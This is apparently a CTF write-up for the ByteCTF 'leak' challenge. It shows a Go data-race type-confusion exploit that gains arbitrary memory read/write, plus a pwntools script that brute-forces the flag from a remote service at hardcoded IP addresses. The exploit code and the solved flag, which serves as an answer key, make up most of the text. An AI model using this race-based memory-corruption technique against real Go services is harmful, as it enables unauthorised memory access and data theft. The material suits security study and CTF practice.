# leak
golang ,添加函数，leak源码中的flag
```
package main

func main() {
	flag := []int64{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
	for i, v := range flag {
		flag[i] = v + 1
	}
	hack()
}

/* your function will be placed here */
/* input the whole hack() function as follow */
/* and end the code with '#' */
/*
func hack() {
	TODO
}
*/
```
利用golang data race造成类型混淆，而后可以进行任意地址读写

考虑flag会在ELF中存一份，在rodata附近爆破出flag保存地址(ELF without PIE)

而后一字节一字节爆破即可

### EXP:
```
from pwn import *
import sys
#context.log_level = 'debug'
p = remote("123.57.209.176",30775)
flag=""
key="1234567890abcdef-" #uuid
flag_index=40#为了稳定，比赛时选择每3字节爆破
for i in range(3):
  for j in key:
      try:
        tmp= 0x0483000+i*0x8
        p = remote("123.56.96.75",30775)
        magic='''
        func hack() {
            type Mem struct {
                 addr *uintptr 
                 data *uintptr
         }
         m := new(Mem)
         var i, j, k interface{}
         i = (*uintptr)(nil)
         j = &m.data
         var z int=0
         go func(){
                for {
                    z++
                    k = i
                    func() {
                        if z < 0 {
                            
                        }
                        return
                    }()
                    k = j
                }
         }()

         for {
          if p, ok := k.(*uintptr); ok && p != nil {  //Race Successuflly
           m.addr = p
           *m.addr=%s
           var o uintptr = *m.data
           if o==%s{   //结果正确=>Crash
                 *m.addr=0
                 *m.data=0
           }

           break
          }
         }
        }
        ''' %(0x483000+72*8+(flag_index+i)*8,ord(j))
        p.sendlineafter("code: \n", magic+"#")
        s=p.recv()
        print s
        if "exit status 2"  in s:
             flag+=j
             print flag
             break
        else:
             print "no 1"
        p.close()
      except:
        p.close()
        print "no"
print flag

#ByteCTF{898ab99c-67d0-4188-81ef-253c12492868}
```